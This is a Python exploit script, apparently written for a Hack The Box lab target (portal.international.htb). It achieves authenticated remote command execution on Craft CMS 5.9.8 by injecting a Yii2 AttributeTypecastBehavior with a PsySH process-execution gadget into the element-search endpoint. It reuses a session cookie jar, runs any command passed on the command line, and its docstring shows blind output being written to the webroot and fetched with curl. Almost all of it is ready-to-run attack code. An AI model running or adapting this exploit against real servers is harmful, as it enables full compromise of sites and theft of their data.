#!/usr/bin/env python3
"""Authenticated Craft CMS 5.9.8 RCE via Yii2 AttributeTypecastBehavior injection.

Sends a JSON body to /admin/actions/element-search/search that attaches a
AttributeTypecastBehavior whose typecastBeforeSave callable is
[Psy\\Readline\\Hoa\\ConsoleProcessus, 'execute'] -> blind command execution.

Usage: layover_rce.py '<shell command>'
Blind: redirect output to the webroot, e.g.
  layover_rce.py 'id > /var/www/portal/web/assets/o.txt 2>&1'
  curl http://portal.international.htb/assets/o.txt
Uses the authenticated cookie jar at /tmp/cj.
"""
import http.cookiejar
import json
import re
import sys
import urllib.request

BASE = "http://portal.international.htb"
COOKIE_JAR = "/tmp/cj"


def csrf(opener):
    html = opener.open(BASE + "/admin/dashboard", timeout=20).read().decode(errors="replace")
    m = re.search(r'csrfTokenValue":"([^"]+)', html)
    if not m:
        raise SystemExit("no csrfTokenValue (session invalid?)")
    return m.group(1)


def main():
    if len(sys.argv) < 2:
        raise SystemExit("usage: layover_rce.py '<command>'")
    cmd = sys.argv[1]

    jar = http.cookiejar.MozillaCookieJar(COOKIE_JAR)
    jar.load(ignore_discard=True, ignore_expires=True)
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    token = csrf(opener)

    body = {
        "elementType": "craft\\elements\\Category",
        "siteId": 1,
        "search": "",
        "condition": {
            "class": "craft\\elements\\conditions\\ElementCondition",
            "elementType": "craft\\elements\\Category",
            "fieldLayouts": [{
                "as rce": {
                    "__class": "yii\\behaviors\\AttributeTypecastBehavior",
                    "__construct()": [{
                        "attributeTypes": {
                            "typecastBeforeSave": [
                                "Psy\\Readline\\Hoa\\ConsoleProcessus",
                                "execute",
                            ]
                        },
                        "typecastBeforeSave": cmd,
                    }],
                },
                "on *": "self::beforeSave",
            }],
        },
    }
    req = urllib.request.Request(
        BASE + "/admin/actions/element-search/search",
        data=json.dumps(body).encode(),
        headers={
            "Content-Type": "application/json",
            "Accept": "application/json",
            "X-CSRF-Token": token,
        },
    )
    try:
        resp = opener.open(req, timeout=40)
        sys.stderr.write("HTTP %s\n" % resp.status)
        sys.stderr.write(resp.read(600).decode(errors="replace") + "\n")
    except urllib.error.HTTPError as exc:
        sys.stderr.write("HTTPERR %s\n" % exc.code)
        try:
            sys.stderr.write(exc.read(600).decode(errors="replace") + "\n")
        except Exception:
            pass
    except Exception as exc:  # other
        sys.stderr.write("EXC %r\n" % (exc,))


if __name__ == "__main__":
    main()
